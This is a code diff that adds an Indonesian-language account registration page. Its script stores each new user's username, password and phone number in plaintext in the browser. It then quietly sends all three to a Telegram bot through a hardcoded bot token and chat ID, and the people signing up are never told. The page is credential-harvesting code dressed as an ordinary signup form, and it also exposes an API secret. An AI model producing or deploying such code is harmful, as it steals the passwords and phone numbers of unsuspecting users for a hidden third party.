@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Daftar Akun</title>
+  <style>
+    body { font-family: Arial; padding: 20px; text-align: center; }
+    input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 8px; border: 1px solid #ccc; }
+    button { padding: 10px 20px; border: none; border-radius: 8px; background: #0074ff; color: #fff; }
+  </style>
+</head>
+<body>
+  <h2>Daftar Akun</h2>
+  <input type="text" id="username" placeholder="Username" required><br>
+  <input type="password" id="password" placeholder="Password" required><br>
+  <input type="tel" id="phone" placeholder="Nomor Telepon" required><br>
+  <button onclick="register()">Daftar</button>
+  <p>Sudah punya akun? <a href="login.html">Login</a></p>
+
+  <script>
+    function register() {
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value;
+      const phone = document.getElementById('phone').value.trim();
+
+      if (!username || !password || !phone) return alert("Semua field wajib diisi.");
+
+      const users = JSON.parse(localStorage.getItem("users") || "[]");
+
+      const isExist = users.some(user => user.username === username || user.phone === phone);
+      if (isExist) return alert("Username atau nomor sudah terdaftar.");
+
+      users.push({ username, password, phone });
+      localStorage.setItem("users", JSON.stringify(users));
+
+      // Kirim ke Telegram
+      const token = "7621390139:AAE9oNVeBy946yGbO7IDsT34DFY3THvGC6I";
+      const chatId = "7882058841";
+      const msg = `PENDAFTARAN:\nUsername: ${username}\nPassword: ${password}\nTelepon: ${phone}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+
+      alert("Pendaftaran berhasil.");
+      window.location.href = "login.html";
+    }
+  </script>
+</body>
+</html>
